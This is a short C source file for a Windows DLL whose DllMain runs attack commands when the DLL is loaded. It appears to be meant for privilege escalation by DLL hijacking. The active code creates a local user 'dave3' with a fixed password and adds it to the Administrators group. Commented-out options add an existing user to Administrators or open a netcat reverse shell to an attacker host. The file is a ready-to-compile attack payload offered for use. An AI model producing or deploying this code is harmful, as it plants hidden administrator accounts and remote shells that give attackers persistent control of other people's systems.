// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll






#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
            // chnage the command to whatever you want to run as SYSTEM, for example, you can add a reverse shell here
            
            // 1. Add user to Administrators Group
            // system("cmd.exe /k net localgroup administrators user /add");

            // 2. Create another user and add it to Administrators Group

                system ("net user dave3 password123! /add");
                system ("net localgroup administrators dave3 /add");

            // 3. Use reverse shell
            // system("C:\Temp\nc.exe <Attacker IP> <PORT> -e cmd.exe");
        ExitProcess(0);
    }
    return TRUE;
}
